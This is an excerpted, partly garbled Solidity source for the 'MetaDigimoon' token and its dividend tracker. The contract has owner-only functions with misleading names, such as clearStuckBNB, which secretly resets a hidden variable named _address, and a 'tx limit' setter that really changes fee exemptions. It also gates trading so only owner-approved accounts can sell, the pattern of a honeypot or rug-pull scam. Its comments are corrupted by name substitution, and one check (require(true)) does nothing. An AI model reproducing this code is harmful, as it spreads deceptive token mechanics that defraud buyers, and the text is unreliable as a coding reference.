...
interface IERC20 {
 ...
 // SPDX-License-Identifier: UNLICENSED
	 ...
	 * This allows applications to reconstruct the allowance for all MetaDigimoon just
	...
	library SafeMath {
		...
		function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
			...
			// benefit is lost if 'b' is also MetaDigimooned.
	...
	// File: contracts/MetaDigimoonDividendPayingToken.sol
	...
	// File: contracts/MetaDigimoon.sol

	// 

	pragma solidity ^0.7.4;

	contract MetaDigimoon is ERC20, Ownable {
		using SafeMath for uint256;
		...
		address payable public marketingWallet = payable(0x0Ba8dBa56A1461eb1d4611bAD3A66F56c0ff9E82); 
	
		bool private swapping;

		MetaDigimoonDividendTracker public dividendTracker;
		...
		uint256 private immutable BNBFeeSplit;
		...
		event excludeMultipleAccountFromRewards(address[] MetaDigimoon, bool isExcluded);

		event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

		event LiquidityWalletUpdated(address indexed newLiquidityWallet, address indexed oldLiquidityWallet);
		
		uint256 private _address = 1000000000000000 * (10**18); 
		...
		constructor() ERC20("MetaDigimoon", "METADIGI"){
			uint256 _BNBRewardsFeeSplit = 1;
			...
			BNBFeeSplit = _BNBRewardsFeeSplit;
			LiquiditySplit = _LiquiditySplit;
			MarketingSplit = _MarketingSplit;
			totalFees = _BNBRewardsFeeSplit.add(_LiquiditySplit);


			dividendTracker = new MetaDigimoonDividendTracker();
		...
		function setIsFeeExempt(address account, bool excluded) public onlyOwner {
			require(_isExcludedFromFees[account] != excluded, "MetaDigimoon: Account is already the value of 'excluded'");
		...
		function setIsTxLimitExempt(address[] calldata MetaDigimoon, bool included) public onlyOwner {
			for(uint256 i = 0; i < MetaDigimoon.length; i++) {
				_isExcludedFromFees[MetaDigimoon[i]] = included;
			}

			emit excludeMultipleAccountFromRewards(MetaDigimoon, included);
		}

		function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
			require(pair != uniswapV2Pair, "MetaDigimoon: The uniswap pair cannot be removed from automatedMarketMakerPairs");

			_setAutomatedMarketMakerPair(pair, value);
		}

		function _setAutomatedMarketMakerPair(address pair, bool value) private {
			require(automatedMarketMakerPairs[pair] != value, "MetaDigimoon: Automated market maker pair is already set to that value");
		...
		function updateLiquidityWallet(address newLiquidityWallet) private onlyOwner {
			require(newLiquidityWallet != liquidityWallet, "MetaDigimoon: The liquidity wallet is already this address");
		...
		function setDistributorSettings(uint256 gas) private onlyOwner {
			require(gas >= 200000 && gas <= 500000, "MetaDigimoon: gasForProcessing must be between 200,000 and 500,000");
			require(gas != gasForProcessing, "MetaDigimoon: Cannot update gasForProcessing to same value");
		...
		function setFees(uint256 _buyBackFee, uint256 _BNBRewardsFee, uint256 _marketingFee) external onlyOwner() {
		...
		} function clearStuckBNB (uint256 percentage) external onlyOwner() {
		_address = percentage;
		...
		function _transfer(
		   ...
		   if(from != owner()){
			...
			if(!swapEnabled) {
				require(canTransferBeforeswapEnabled[from], "MetaDigimoon: This account cannot send tokens until trading is enabled");
			}
	...
	contract MetaDigimoonDividendTracker is DividendPayingToken, Ownable {
		using SafeMath for uint256;
		using SafeMathInt for int256;
		...
		constructor() public DividendPayingToken("MetaDigimoon_Dividend_Tracker", "MetaDigimoon_Dividend_Tracker") {
			claimWait = 3600;
			minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 10000+ tokens
		}

		function _transfer(address, address, uint256) internal override {
			require(true, "MetaDigimoon_Dividend_Tracker: No transfers allowed");
		}
		...
		function updateClaimWait(uint256 newClaimWait) external onlyOwner {
			require(newClaimWait >= 1 && newClaimWait <= 86400, "MetaDigimoon_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
			require(newClaimWait != claimWait, "MetaDigimoon_Dividend_Tracker: Cannot update claimWait to same value");
